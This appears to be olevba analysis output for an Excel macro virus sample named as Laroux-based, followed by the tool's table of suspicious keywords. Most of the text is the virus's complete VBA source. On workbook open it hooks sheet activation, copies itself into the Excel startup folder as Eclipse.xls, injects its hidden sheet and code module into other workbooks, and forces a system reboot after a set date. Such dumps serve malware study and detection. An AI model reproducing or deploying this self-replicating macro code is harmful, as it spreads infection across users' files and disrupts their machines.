olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-994c765855651603f2781f0519a639e472f2cc57
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet21.cls 
in file: Virus.MSExcel.Laroux-based-994c765855651603f2781f0519a639e472f2cc57 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet21'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 


Option Explicit

-------------------------------------------------------------------------------
VBA MACRO Jcode.bas 
in file: Virus.MSExcel.Laroux-based-994c765855651603f2781f0519a639e472f2cc57 - OLE stream: '_VBA_PROJECT_CUR/VBA/Jcode'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'===================================
'Date Modified:  03/07/00
'Created by: SubZero
'===================================
Declare Function ExitWindowsEx Lib "user32" (ByVal uFlags As Long, _
ByVal dwReserved As Long) As Long
Public Const EWX_LOGOFF = 0
Public Const EWX_SHUTDOWN = 1
Public Const EWX_REBOOT = 2
Public Const EWX_FORCE = 4
Public Const EWX_POWEROFF = 8
Dim mobjExitDialog As Object
Sub auto_open()
    Application.OnSheetActivate = "Trash_em"
End Sub
Sub Trash_em()
Attribute Trash_em.VB_ProcData.VB_Invoke_Func = " \n14"
Dim lngRetVal As Long
    c$ = Application.StartupPath
    M$ = Dir(c$ & "\" & "Eclipse.xls")
    M$ = UCase(M$)
    If M$ = "ECLIPSE.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then W = 1 Else W = 0
    whichfile = p + W * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    With ActiveWorkbook
        .Title = "WE MEAN U NO HARM!!!"
        .Subject = "Shuts you down."
        .Author = "Whome?"
        .Keywords = "Sayonara"
        .Comments = "Para sa inyong lahat!!!"
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    On Error GoTo wer_err
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs Filename:=Application.StartupPath & "/" & "Eclipse.xls", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Application.OnSheetActivate = ""
    Application.OnSheetActivate = "Eclipse.xls!Trash_em"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    SS$ = ActiveSheet.Name
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "1974" Then
        Workbooks("Eclipse.xls").Sheets("1974").Copy before:=Workbooks(n4$).Sheets(SS$)
        Workbooks("Eclipse.xls").Sheets("Jcode").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("1974").Visible = False
    Else
    End If
   Application.OnSheetActivate = ""
   Application.OnSheetActivate = "Eclipse.xls!Trash_em"
   Case Else
End Select
Application.ScreenUpdating = True
If Format(Now(), "mm/dd/yy") > "03/15/00" Then
    lngRetVal = ExitWindowsEx(EWX_REBOOT, 0&)
End If
Exit Sub
wer_err:
If Err.Number = 76 Then
    MkDir Application.StartupPath
    Resume
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  Jcod
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     12 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, hidden -  197
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

